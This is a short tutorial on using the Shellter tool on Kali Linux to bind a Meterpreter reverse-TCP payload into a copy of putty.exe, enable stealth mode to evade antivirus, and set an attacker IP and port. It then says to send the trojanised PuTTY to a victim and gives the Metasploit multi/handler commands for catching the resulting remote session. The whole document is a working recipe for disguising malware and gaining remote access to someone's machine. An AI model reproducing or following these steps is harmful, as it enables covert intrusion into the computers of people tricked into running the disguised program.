Shellter is an active shellcode insertion tool. It effectively re-encodes payloads (here shellcode) to bypass anti-virus (AV) software.
To use Shellter, you can either create your own shellcode or create one from a framework such as Metasploit. 
Shellter embeds a 32-bit Windows application and the shellcode in such a way that it goes undetected by the AV software.

apt-get install shellter
apt-get install wine32
---------------------------------------------------------------------------------------
Open Shellter
When you open Shellter in Kali in wine mode, it prompts you to choose operation mode.
Select the mode as ‘a’. It stands for auto. 
Now, you need to choose an executable file and copy it to the Shellter folder. This is required to be done to bind Shellter with a .exe file. 
In our case, we have copied the putty.exe file as example to the Shellter folder and bound it with the shellter.exe file.
When asked for PE Target, type the following command:

/root/Downloads/putty.exe
Press the Enter key to continue. You may see DisASM.dll file gets successfully created. Enable Stealth Mode. Then, you are prompted to enable stealth mode.
Type ‘y’ for yes.

Type ‘L’ to use from the listed payload.
ou can select payload of your choice. In our case, we have selected 1 for Meterpreter_Reverse_TCP
 set LHOST and LPORT
In our case, we have set LHOST 192.168.1.109 [Attacker IP] LPORT as 4444

Send PuTTY.exe File to Victim’s Machine
----------------------------------------------------------------------------------------------------
Run Exploit

In a new terminal type msfconsole to launch Metasploit framework and execute the following command

use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost <IP>
set lport <port-no.>
exploit

When the victim clicks the putty.exe file which will appear as similar to original putty.exe and hence the victim will get trapped and we will get a meterpreter session.
